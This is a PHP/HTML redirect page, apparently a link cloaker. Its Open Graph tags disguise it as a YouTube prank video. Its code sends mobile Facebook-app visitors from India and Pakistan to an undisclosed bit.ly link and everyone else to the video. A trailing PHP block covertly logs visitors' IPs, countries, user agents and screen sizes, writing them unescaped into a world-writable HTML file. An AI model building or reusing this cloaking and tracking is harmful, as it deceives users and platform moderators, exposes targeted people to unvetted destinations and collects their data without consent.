<?php

//print_r($_COOKIE);
$iplogfile = 'logs/ip-address-mainsite2.html';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$webpage = $_SERVER['QUERY_STRING'];
$timestamp = date('d/m/Y h:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'];
$country_code = $_SERVER["HTTP_CF_IPCOUNTRY"];
$user_ip_cloud = $_SERVER["HTTP_CF_CONNECTING_IP"];
$browser = get_browser(null,true);

if($browser['parent'] == 'Facebook App for Android' || $browser['parent'] == 'Facebook App for iOS')
{
    if($browser['ismobiledevice'] == 1 || $browser['istablet'] ==1){
    if($country_code == 'IN' || $country_code == 'PK'){
    header("Location: https://bit.ly/3hJP1a5");exit();
    }
    else{
       
    header('Location: https://www.youtube.com/watch?v=NvVPBps0lNU');exit();
    }
    }
}
header('Location: https://www.youtube.com/watch?v=NvVPBps0lNU');
exit();

/*$fp = fopen($iplogfile, 'a+');
chmod($iplogfile, 0777);
if($ipaddress == $user_ip_cloud)
$user_ip_cloud="";
fwrite($fp, '['.$timestamp.']: '.$ipaddress.' '.$user_ip_cloud.' Parameters: '.$webpage.' | Country: '.$country_code.' <br><br>'.json_encode($browser). ' <br> UA:'.$ua." \n<br><br>");
fclose($fp);
*/

?>

<!doctype html><html lang="en" prefix="og: http://ogp.me/ns#" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><meta name="robots" content="noindex">
<meta property="og:type" content="article" /> 
<meta property="og:locale" content="en_US" /> 
 <meta property="og:image" content="https://img.youtube.com/vi/NvVPBps0lNU/maxresdefault.jpg" />
 <meta property="og:image:url" content="https://i.ytimg.com/vi/NvVPBps0lNU/maxresdefault.jpg" />
 <meta property="og:title" content="2 in One Prank with GOLD DIGGER BHABI & TIK TOK STAR" /> 
 <meta property="og:description" content="#ALL_IN_ONE , PRANK" /> 
 <meta property="og:url" content="https://www.youtube.com/watch?v=NvVPBps0lNU" /> 
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-72618212-22']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>


<script type="text/javascript">setTimeout(function(){window.location.href = 'https://www.youtube.com/watch?v=NvVPBps0lNU';}, 1000);</script>
<meta http-equiv="Refresh" content="1; URL=https://www.youtube.com/watch?v=NvVPBps0lNU">
<script type="text/javascript">
		function load_image()
		{
			document.getElementById("loading").innerHTML = '<a href="https://www.youtube.com/watch?v=NvVPBps0lNU">Click here to proceed</a>';
		}
		setTimeout('load_image()', 3000); 
	</script>
</head>
<body>
<div style="margin-top:250px; text-align:center;" align="center">
<div id="loading"></div>
</div>
<script>
function createCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}

createCookie("width",screen.width,1);
createCookie("height",screen.height,1);


</script>
</body>
</html>
<?php

//print_r($_COOKIE);
$iplogfile = 'logs/ip-address-mainsite2.html';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$webpage = $_SERVER['QUERY_STRING'];
$timestamp = date('d/m/Y h:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'];
$screenwidth = $_COOKIE['width'];
$screenheight = $_COOKIE['height'];
$country_code = $_SERVER["HTTP_CF_IPCOUNTRY"];
$user_ip_cloud = $_SERVER["HTTP_CF_CONNECTING_IP"];
$browser = get_browser(null,true);

$fp = fopen($iplogfile, 'a+');
chmod($iplogfile, 0777);
if($ipaddress == $user_ip_cloud)
$user_ip_cloud="";
fwrite($fp, '['.$timestamp.']: '.$ipaddress.' '.$user_ip_cloud.' | Screen: '.$screenwidth.':'.$screenheight.' | '.$webpage.' | '.$country_code.' <br>'.json_encode($browser). ' <br> UA:'.$ua." \n<br><br>");
fclose($fp);

?>
